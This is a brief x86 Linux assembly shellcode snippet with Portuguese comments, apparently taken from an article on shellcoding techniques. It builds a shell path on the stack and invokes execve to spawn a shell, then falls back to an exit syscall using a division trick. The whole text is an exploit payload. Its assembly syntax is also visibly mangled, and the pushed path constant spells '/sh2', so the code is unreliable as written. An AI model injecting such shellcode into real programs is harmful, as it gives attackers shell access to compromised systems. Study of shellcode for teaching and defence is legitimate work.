# article: http://chmodsecurity.com.br/artigo/16/tecnicas-avancadas-shellcoding-[assembly].html
# shellcoding math
xorl% ebx,% ebx
mul% ebx
push% edx
pushl $ 0x3268732f #/bin/sh 
pushl $ 0x6e69622f 
mov% esp,% ebx
push% edx
push% ebx
mov% esp,% ecx
movb $ 0xB,% al # execve () syscall, não retornar a menos que ele falhar, caso em que ele retorna -1
int $ 0x80 #syscall
#syscall exit() ExitProcess 
divl% eax # -1 / -1 = 1 # Aqui a Magica acontece :D 
int $ 0x80 #
